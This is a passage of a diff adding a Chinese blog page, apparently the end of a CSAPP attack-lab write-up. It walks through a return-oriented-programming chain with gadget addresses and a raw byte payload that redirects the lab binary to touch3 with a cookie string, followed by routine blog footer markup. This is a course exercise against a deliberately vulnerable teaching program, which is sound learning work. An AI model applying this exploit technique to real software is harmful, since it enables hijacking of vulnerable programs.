+<li>将 %eax 中的1送到 %edi 寄存器，机器码 <code>89 c7</code> ，地址是 0x4019c6；</li>
+<li>现在必须让 %eax 中的1送到 %esi 中，但是 farm 中没有直接实现这个功能的机
+器码 <code>89 c6</code> ，只能绕几个弯来实现了：
+
+<ol>
+<li>无非是将 %eax 的值传送（movl）给别的寄存器，再送给 %esi，可能不止绕
+一次；</li>
+<li>movl 的机器码表示是 <code>89</code> ，但是 farm 中的机器码这么多，不可能一个一
+个找过去，这时候 lab 的指导文档提供的附录就非常有用了，其实它已经明
+确指出了在这次 lab 中必然会用到 functional nop 指令，这些指令不会改
+变操作符中寄存器的值；</li>
+<li>在 farm 中搜索这些 functional nop 的机器码，以及这些机器码前是否
+<code>89</code> 这个 movl 机器码，可以找到三个有用的 gadget，分别实现了 <code>movl
+            %eax,%edx</code>, <code>movl %edx,%ecx</code>, <code>movl %ecx,%esi</code>, 地址分别是：
+0x401a42, 0x401a34, 0x401a27</li>
+<li>在跳转执行这三个地址的机器码之后，%esi 中的值就是1了（与movb、movw不
+同，movl指令将会填充目的寄存器的低32位，并使高32位全部为0；所以，
+%rsi中的值也是1）</li>
+</ol></li>
+<li>每次跳转到第1步中说明的地址，完成运行之后必须再次将 %eax 的内容送 %edi
+及 %esi，然后再次跳到第3步中说明的地址，反复多次直到 %esi 中的值就是32
+为止；</li>
+<li>所以刚开始的跳转序列应该是：d0 19 40 00 00 00 00 00 c6 19 40 00 00 00
+00 00 42 1a 40 00 00 00 00 00 34 1a 40 00 00 00 00 00 27 1a 40 00 00 00
+00 00 d6 19 40 00 00 00 00 00 c6 19 40 00 00 00 00 00 42 1a 40 00 00 00
+00 00 34 1a 40 00 00 00 00 00 27 1a 40 00 00 00 00 00 d6 19 40 00 00 00
+00 00 c6 19 40 00 00 00 00 00 42 1a 40 00 00 00 00 00 34 1a 40 00 00 00
+00 00 27 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 c6 19 40 00 00 00
+00 00 42 1a 40 00 00 00 00 00 34 1a 40 00 00 00 00 00 27 1a 40 00 00 00
+00 00 d6 19 40 00 00 00 00 00 c6 19 40 00 00 00 00 00 42 1a 40 00 00 00
+00 00 34 1a 40 00 00 00 00 00 27 1a 40 00 00 00 00 00 d6 19 40 00 00 00
+00 00 42 1a 40 00 00 00 00 00 34 1a 40 00 00 00 00 00 27 1a 40 00 00 00
+00 00</li>
+</ol></li>
+<li>然后就像计算偏移量中所提及的，进行最后几次跳转，地址依次是：
+
+<ol>
+<li>0x401a06，取得当前栈顶，将当前的 %rsp 送给 %rax；</li>
+<li>0x4019c5，将 %rax 送 %rdi；</li>
+<li>0x4019d6，将 %rdi 与偏移量相加，结果存储在 %rax 中；</li>
+<li>0x4019c5，将 $rax 送 %rdi;</li>
+<li>0x4018fa，执行 touch3；</li>
+</ol></li>
+<li>最后的结果的机器码表示就是：前面40组 00 ，中间是2.7中列出的那一大串，最后
+就是 06 1a 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 d6 19 40 00 00 00 00
+00 c5 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00，再然后是 cookie 字符串
+的机器级表示。</li>
+</ol></li>
+</ol>
+
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">zero4drift</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">2019-01-14</span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">CC BY-NC-ND 4.0</a></span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://zero4drift.github.io/tags/csapp-lab/">csapp-lab</a>
+          <a href="https://zero4drift.github.io/tags/c/">c</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/csapp-cachelab-jie-ti-si-lu-ji-lu/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">CSAPP-cachelab 解题思路记录</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/csapp-bomb-jie-ti-si-lu-ji-lu/">
+            <span class="next-text nav-default">CSAPP-bomb 解题思路记录</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+  
+    <div class="post bg-white">
+      <script src="https://utteranc.es/client.js"
+            repo= "zero4drift/comments-for-my-blog"
+            issue-term="pathname"
+            crossorigin="anonymous"
+            async>
+      </script>
+    </div>
+  
+
+  
+
+  
+
+  
+  
+    
+
+
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+  
+  
+    <a href="fang0052@e.ntu.edu.sg" rel="me noopener" class="iconfont"
+      title="email"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
+</svg>
+
+    </a>
+  
+    <a href="https://github.com/zero4drift" rel="me noopener" class="iconfont"
+      title="github"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M512 12.672c-282.88 0-512 229.248-512 512 0 226.261333 146.688 418.133333 350.08 485.76 25.6 4.821333 34.986667-11.008 34.986667-24.618667 0-12.16-0.426667-44.373333-0.64-87.04-142.421333 30.890667-172.458667-68.693333-172.458667-68.693333C188.672 770.986667 155.008 755.2 155.008 755.2c-46.378667-31.744 3.584-31.104 3.584-31.104 51.413333 3.584 78.421333 52.736 78.421333 52.736 45.653333 78.293333 119.850667 55.68 149.12 42.581333 4.608-33.109333 17.792-55.68 32.426667-68.48-113.706667-12.8-233.216-56.832-233.216-253.013333 0-55.893333 19.84-101.546667 52.693333-137.386667-5.76-12.928-23.04-64.981333 4.48-135.509333 0 0 42.88-13.738667 140.8 52.48 40.96-11.392 84.48-17.024 128-17.28 43.52 0.256 87.04 5.888 128 17.28 97.28-66.218667 140.16-52.48 140.16-52.48 27.52 70.528 10.24 122.581333 5.12 135.509333 32.64 35.84 52.48 81.493333 52.48 137.386667 0 196.693333-119.68 240-233.6 252.586667 17.92 15.36 34.56 46.762667 34.56 94.72 0 68.522667-0.64 123.562667-0.64 140.202666 0 13.44 8.96 29.44 35.2 24.32C877.44 942.592 1024 750.592 1024 524.672c0-282.752-229.248-512-512-512"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://zero4drift.github.io/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+  
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - <a class="theme-link" href="https://github.com/xianmin/hugo-theme-jane">Jane</a>
+  </span>
+
+  <span class="copyright-year">
+    &copy;
+    
+      2018 -
+    2019
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        zero4drift
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
